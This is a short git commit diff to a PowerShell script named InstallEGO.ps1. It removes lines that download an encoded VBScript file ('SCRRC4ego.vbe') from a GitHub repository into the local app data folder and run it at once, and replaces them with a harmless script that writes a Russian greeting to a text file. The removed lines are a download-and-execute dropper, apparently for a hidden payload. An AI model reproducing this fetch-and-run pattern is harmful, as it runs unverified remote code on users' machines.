5135371dce30000f0c90a1885487d9bdeae86e69
andezzzWW <andezzzww@gmail.com>
2025-10-17 15:48:47 +0300

    Update InstallEGO.ps1

--- InstallEGO.ps1
+++ InstallEGO.ps1
@@ -1,7 +1,2 @@
-$Url = "https://github.com/andezzzWW/death-note/raw/refs/heads/main/SCRRC4ego.vbe"
-$FileName = "ego.vbe"
-$LocalAppData = [Environment]::GetFolderPath("LocalApplicationData")
-$DownloadPath = Join-Path $LocalAppData $FileName
-
-Invoke-WebRequest -Uri $Url -OutFile $DownloadPath
-Start-Process -FilePath $DownloadPath
+Set-Content -Path "приветствие.txt" -Value "привет !" -Encoding UTF8
+Write-Host "Файл создан!"
